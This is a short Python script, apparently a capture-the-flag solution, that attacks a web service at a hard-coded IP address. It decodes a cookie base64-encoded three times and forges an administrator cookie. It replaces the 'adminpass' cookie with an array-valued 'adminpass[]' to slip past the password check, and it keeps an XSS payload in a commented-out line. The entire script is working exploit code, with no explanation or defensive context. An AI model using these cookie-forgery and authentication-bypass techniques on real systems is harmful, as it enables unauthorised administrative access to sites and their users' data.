import base64
import requests
from urllib.parse import quote_plus as url_escape

def decode_cookiez(cookiez):
	a = base64.b64decode(cookiez)
	b = base64.b64decode(a)
	c = base64.b64decode(b)
	return c.decode()

def encode_cookiez(cookiez):
	a = base64.b64encode(cookiez.encode())
	b = base64.b64encode(a)
	c = base64.b64encode(b)
	return c.decode()

url = 'http://199.247.6.180:12008/'
r = requests.get(url)
print(r.cookies)

decoded = decode_cookiez(r.cookies['cookiez'])
print(decoded)

encoded = encode_cookiez('{"id":"1","type":"admin"}')
print(encoded)

r.cookies['cookiez'] = encoded
#r.cookies['adminpass'] = "><script>alert('XSS')</script><h1"

del r.cookies['adminpass']
r.cookies['adminpass[]'] = 'hi'

r = requests.get(url, cookies=r.cookies)
print(r.text)
print(r.cookies)
